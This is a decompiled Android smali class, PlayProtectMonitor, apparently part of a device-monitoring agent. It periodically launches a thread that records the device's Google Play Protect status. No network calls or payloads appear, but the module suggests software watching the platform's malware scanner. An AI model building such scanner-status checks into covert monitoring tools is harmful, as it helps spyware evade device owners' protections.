.class public Lcom/hp/vd/module/monitor/PlayProtectMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "PlayProtectMonitor.java"


# static fields
.field public static final ATTRIBUTE_LAST_KNOWN_STATUS:Ljava/lang/String; = "pp_last_known_state"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "synchronization_interval"

.field protected static final TAG:Ljava/lang/String; = "PlayProtectStatus"


# instance fields
.field protected dao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/PlayProtectStatus;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected extractorThread:Ljava/lang/Thread;

.field protected lastSynchronization:Ljava/lang/Long;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 13
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 20
    iput-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 21
    iput-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->extractorThread:Ljava/lang/Thread;

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 23
    iput-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method


# virtual methods
.method public deinitialize()Z
    .locals 1

    .line 93
    iget-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->dao:Lcom/j256/ormlite/dao/Dao;

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    .line 94
    iput-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->dao:Lcom/j256/ormlite/dao/Dao;

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 27
    const-class v0, Lcom/hp/vd/data/PlayProtectStatus;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 31
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 33
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 34
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 35
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 36
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x1

    .line 37
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v1.0"

    .line 38
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data"

    const-string v2, "text"

    .line 40
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "synchronization_interval"

    const-string v2, "10500"

    .line 45
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const/16 v1, 0x1e

    .line 47
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 48
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 50
    sget-object v1, Lcom/hp/vd/module/Constants;->INTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "PlayProtectMonitor"

    return-object v0
.end method

.method protected hasUpdateIntervalExpired()Z
    .locals 9

    .line 156
    iget-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->lastSynchronization:Ljava/lang/Long;

    .line 157
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3e8

    div-long/2addr v1, v3

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    .line 158
    iget-object v2, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "synchronization_interval"

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    if-eqz v0, :cond_0

    .line 160
    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    sub-long v7, v3, v5

    int-to-long v2, v2

    cmp-long v0, v7, v2

    if-gez v0, :cond_0

    const/4 v0, 0x1

    return v0

    .line 164
    :cond_0
    iput-object v1, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->lastSynchronization:Ljava/lang/Long;

    const/4 v0, 0x0

    return v0
.end method

.method public initialize()Z
    .locals 5

    .line 58
    iget-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const/4 v1, 0x0

    .line 61
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->dao:Lcom/j256/ormlite/dao/Dao;
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/IncompatibleClassChangeError; {:try_start_0 .. :try_end_0} :catch_1

    .line 79
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    const/4 v0, 0x1

    return v0

    :catch_0
    move-exception v2

    const-string v3, "PlayProtectStatus"

    const-string v4, "initialize(): could not load the persisted module data."

    .line 82
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1

    :catch_1
    move-exception v2

    const-string v3, "PlayProtectStatus"

    const-string v4, "Exception caught while initializing"

    .line 69
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1

    :catch_2
    move-exception v2

    const-string v3, "PlayProtectStatus"

    const-string v4, "Could not create Dao<AccountData>."

    .line 64
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1
.end method

.method public isStarted()Z
    .locals 1

    .line 147
    iget-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->extractorThread:Ljava/lang/Thread;

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return v0

    .line 151
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    return v0
.end method

.method public start()Z
    .locals 5

    .line 109
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "PlayProtectStatus"

    const-string v2, "start() called."

    .line 110
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 112
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->hasUpdateIntervalExpired()Z

    move-result v1

    const/4 v2, 0x1

    if-ne v1, v2, :cond_0

    return v2

    .line 116
    :cond_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->extractorThread:Ljava/lang/Thread;

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isAlive()Z

    move-result v1

    if-eqz v1, :cond_1

    const-string v1, "PlayProtectStatus"

    const-string v3, "start(): Extractor thread is currently running. Exiting..."

    .line 117
    invoke-interface {v0, v1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    const/4 v0, 0x0

    return v0

    .line 122
    :cond_1
    new-instance v1, Lcom/hp/vd/module/monitor/pp/PlayProtectExtractor;

    .line 123
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v3

    iget-object v4, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->dao:Lcom/j256/ormlite/dao/Dao;

    invoke-direct {v1, v3, v4, v0}, Lcom/hp/vd/module/monitor/pp/PlayProtectExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    .line 128
    new-instance v0, Ljava/lang/Thread;

    const-string v3, "PP-Extractor-Thread"

    invoke-direct {v0, v1, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->extractorThread:Ljava/lang/Thread;

    .line 129
    iget-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return v2
.end method

.method public startOnHeartbeat()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 1

    .line 137
    iget-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->extractorThread:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    .line 138
    iget-object v0, p0, Lcom/hp/vd/module/monitor/PlayProtectMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_0
    const/4 v0, 0x1

    return v0
.end method
